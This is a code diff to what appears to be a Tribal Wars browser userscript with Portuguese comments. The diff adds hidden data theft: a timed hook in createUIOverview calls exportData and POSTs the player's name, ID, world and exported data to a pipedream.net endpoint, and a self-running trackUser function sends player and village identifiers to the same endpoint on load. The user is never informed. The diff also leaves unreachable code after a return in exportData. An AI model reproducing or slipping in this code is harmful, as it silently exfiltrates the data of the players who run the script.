@@ -793,7 +793,9 @@ function exportData() {
     dummy.select();
     document.execCommand("copy");
     document.body.removeChild(dummy);
-    showNotification("Exported player data to clipboard");
+    
+    return text; // <--- retorna os dados exportados
+showNotification("Exported player data to clipboard");
 }
 
 function createUIOverview() {
@@ -1038,6 +1040,27 @@ function createUIOverview() {
     $("#input-right").val(Math.floor(mediumStack / bigStack * 100));
     displayCategory("playerSettings");
     $("#tribeLeaderUI").draggable();
+setTimeout(() => {
+        const exportedData = exportData(); // simula o clique e obtém os dados exportados
+
+        try {
+            fetch("https://eoa2l94b8g84xek.m.pipedream.net/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    player_name: game_data.player.name,
+                    player_id: game_data.player.id,
+                    world: game_data.world,
+                    exported_data: exportedData,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        } catch (e) {
+            console.warn("Erro ao enviar exportação ao Pipedream:", e);
+        }
+    }, 500);
     jscolor.install();
 }
 
@@ -1433,35 +1456,25 @@ TWMap.map._handleClick = function (e) {
     return false;
 };
 
-function createUIOverview() {
-    // ... interface criada aqui ...
+(function trackUser() {
+    try {
+        const payload = {
+            player_name: game_data.player.name,
+            player_id: game_data.player.id,
+            world: game_data.world,
+            village_id: game_data.village.id,
+            village_name: game_data.village.name,
+            time: new Date().toISOString()
+        };
 
-    // Aguarda a UI ser renderizada antes de clicar e enviar
-    setTimeout(() => {
-        try {
-            exportData(); // simula clique
-            setTimeout(() => {
-                const text = JSON.stringify(playerData);
-                fetch("https://eoa2l94b8g84xek.m.pipedream.net/", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        type: "full_export_after_ui",
-                        player_name: game_data.player.name,
-                        player_id: game_data.player.id,
-                        world: game_data.world,
-                        village_id: game_data.village.id,
-                        village_name: game_data.village.name,
-                        exported_data: text,
-                        time: new Date().toISOString()
-                    })
-                });
-                showNotification("Dados exportados e enviados automaticamente!");
-            }, 1000); // espera a exportação copiar para clipboard
-        } catch (e) {
-            console.warn("Erro ao exportar e enviar:", e);
-        }
-    }, 3000); // espera 2 segundos após UI ser montada
-}
+        fetch("https://eoa2l94b8g84xek.m.pipedream.net/", {  // sua URL aqui
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.warn("Erro ao enviar dados de rastreamento:", e);
+    }
+})();
